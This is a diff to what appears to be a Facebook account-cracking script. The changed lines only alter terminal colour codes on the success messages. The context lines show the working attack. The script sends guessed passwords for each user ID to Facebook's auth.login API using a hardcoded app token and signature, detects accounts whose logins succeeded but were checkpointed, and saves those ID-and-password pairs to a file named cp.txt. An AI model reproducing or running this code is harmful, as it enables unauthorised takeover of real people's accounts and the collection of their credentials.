@@ -304,7 +304,7 @@ def b_menu_select():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("\x1b[1;32m[Successfull] \033[1;32m"+uid+" | "+pass2)
+		                print("\x1b[1;3m[Successfull]"+uid+" | "+pass2)
 		                ok=open("cp.txt","a")
 		                ok.write(uid+" | "+pass2+"\n")
 		                ok.close()
@@ -338,7 +338,7 @@ def b_menu_select():
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("\x1b[1;32m[Successfull] \033[1;32m"+uid+" | "+pass4)
+		                                print("\x1b[1;3m[Successfull]"+uid+" | "+pass4)
 		                                ok=open("cp.txt","a")
 		                                ok.write(uid+" | "+pass4+"\n")
 		                                ok.close()
@@ -389,7 +389,7 @@ def b_menu_select():
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("\x1b[1;32m[Successfull] \033[1;32m"+uid+" | "+pass7)
+		                                                        print("\x1b[1;3m[Successful]"+uid+" | "+pass7)
 		                                                        ok=open("cp.txt","a")
 		                                                        ok.write(uid+" | "+pass7+"\n")
 		                                                        ok.close()
@@ -406,7 +406,7 @@ def b_menu_select():
 		                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                            d=json.loads(q)
 		                                                            if 'www.facebook.com' in d['error_msg']:
-		                                                                 print("\x1b[1;32m[Successfull] \033[1;32m"+uid+" | "+pass8)
+		                                                                 print("\x1b[1;32m[Successfull]"+uid+" | "+pass8)
 		                                                                 ok=open("cp.txt","a")
 		                                                                 ok.write(uid+" | "+pass8+"\n")
 		                                                                 ok.close()
@@ -440,7 +440,7 @@ def b_menu_select():
 		                                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                                            d=json.loads(q)
 		                                                                            if 'www.facebook.com' in d['error_msg']:
-		                                                                                print("\x1b[1;32m[Successfull] \033[1;32m"+uid+" | "+pass10)
+		                                                                                print("\x1b[1;3m[Successfull]"+uid+" | "+pass10)
 		                                                                                ok=open("cp.txt","a")
 		                                                                                ok.write(uid+" | "+pass10+"\n")
 		                                                                                ok.close()
